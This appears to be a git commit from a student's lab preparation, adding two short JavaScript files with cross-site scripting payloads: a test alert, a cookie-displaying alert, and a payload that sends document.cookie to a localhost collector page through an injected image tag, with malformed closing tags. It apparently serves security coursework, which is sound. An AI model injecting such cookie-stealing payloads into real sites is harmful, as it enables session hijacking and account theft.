ce7399d2e7eaa37c89516e852a1b3008852aeb15
Nora <nora.wernerson@gmail.com>
2017-12-13 09:58:31 +0100

    JavaScript labbförberedelserna tillagda

---
+++ Labb/Prelab1.js
@@ -0,0 +1,3 @@
+<script>
+alert("Test XSS vulnerability" );
+<\script>
---
+++ Labb/Prelab2StealCookis.js
@@ -0,0 +1,8 @@
+<script>
+alert(document.cookie)
+<\script>
+
+
+<script>
+document.write('<img src = "localhost/index.php?cookie= ' + escape(document.cookie) + '"/>');
+<\script>
